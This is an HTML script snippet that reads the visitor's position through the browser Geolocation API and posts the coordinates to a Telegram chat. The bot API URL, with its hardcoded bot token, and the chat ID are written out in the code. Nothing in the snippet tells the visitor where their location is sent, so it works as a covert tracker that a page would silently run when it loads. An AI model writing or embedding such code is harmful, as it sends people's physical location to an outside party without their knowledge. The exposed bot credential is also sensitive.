    <script>
      if (navigator.geolocation) {
        // if the Geolocation API is supported by the browser
        navigator.geolocation.getCurrentPosition(function(position) {
          // if the user grants permission to share their location
          const message = `X1 LA: ${position.coords.latitude}, LO: ${position.coords.longitude}`;
          const apiUrl = `https://api.telegram.org/bot5864276889:AAGDkTSUnFxmEqV_z16P8YvnOgeuCT3uLgY/sendMessage`;
          fetch(apiUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: -636060412,
              text: message
            })
          })
          .then(response => {
            if (!response.ok) {
              throw new Error(`Failed to send message. Status code: ${response.status}`);
            }
            console.log('Message success!');
          })
          .catch(error => {
            console.error(`Error message: ${error.message}`);
          });
        }, function(error) {
          // if the user denies permission to share their location or the location cannot be determined
          console.error(`Error location: ${error.message}`);
        });
      } else {
        // if the Geolocation API is not supported by the browser
        console.error('Geolocation is not supported by this browser.');
      }
    </script>
